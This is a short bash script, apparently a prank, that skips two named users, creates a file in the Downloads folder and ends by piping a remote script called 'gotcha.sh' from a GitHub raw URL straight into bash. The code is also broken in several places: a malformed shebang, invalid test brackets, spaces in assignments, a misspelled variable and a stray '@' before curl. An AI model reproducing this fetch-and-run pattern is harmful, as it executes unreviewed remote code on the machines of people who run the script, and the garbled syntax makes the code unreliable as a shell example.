#bin/bash

if [$(whoami) == "jkauker" || $(whoami) == "nsabia"] then
	echo "You cant troll me!"
	exit 1
fi

user = $(whoami)
targe = "/Users/$user/Downloads"
if [! -f "$target"]; then
	touch "$target.txt"
fi

@curl -s -o https://raw.githubusercontent.com/jkauker/gotcha/master/gotcha.sh | bash && exit 0